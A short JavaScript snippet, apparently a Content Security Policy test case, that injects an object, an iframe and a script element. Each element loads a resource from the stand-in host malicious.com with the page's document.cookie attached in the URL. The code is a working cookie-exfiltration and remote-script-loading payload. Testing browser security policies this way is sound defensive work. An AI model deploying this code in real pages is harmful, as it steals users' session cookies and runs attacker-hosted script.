(function(){

		var o = document.createElement("object");
		o.data = `http://malicious.com/bypass-object-src.html?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
		document.body.appendChild(o);

		var i = document.createElement("iframe");
		i.src = `http://malicious.com/bypass-child-src.html?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
		document.body.appendChild(i);

		var s = document.createElement("script");
		s.src = `http://malicious.com/bypass-script-src.js?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
		document.body.appendChild(s);

}())
